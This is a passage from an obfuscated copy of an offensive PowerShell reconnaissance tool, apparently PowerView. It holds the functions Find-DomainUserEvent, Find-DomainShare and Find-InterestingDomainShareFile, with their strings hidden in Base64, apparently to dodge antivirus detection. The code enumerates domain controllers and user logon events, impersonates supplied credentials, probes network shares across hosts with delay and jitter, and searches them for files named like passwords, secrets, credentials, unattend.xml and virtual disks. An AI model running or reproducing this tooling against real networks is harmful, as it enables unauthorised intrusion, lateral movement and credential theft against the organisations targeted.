        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5AA==')))] -or (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIA')))])) {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $UserGroupIdentity"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            $TargetComputers = $ComputerName
        }
        else {
            $DCSearcherArguments = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $DCSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $DCSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $DCSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
        Write-Verbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
        if ($TargetComputers.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        'ComputerName' = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFQAaQBtAGUA')))] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAVABpAG0AZQA=')))] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgARQB2AGUAbgB0AHMA')))] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA'))))) {
                                        $Operator = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA')))
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result
                if ($Result -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $Threads"
            $ScriptParams = @{
                'StartTime' = $StartTime
                'EndTime' = $EndTime
                'MaxEvents' = $MaxEvents
                'TargetUsers' = $TargetUsers
                'Filter' = $Filter
                'Credential' = $Credential
            }
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}
function Find-DomainShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)
            if ($TokenHandle) {
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        $Path = '\\'+$TargetComputer+'\'+$ShareName
                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            if ($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }
        $LogonToken = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"
            $ScriptParams = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = $LogonToken
            }
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Find-InterestingDomainShareFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,
        [String[]]
        $ExcludedShares = @('C$', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0ACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
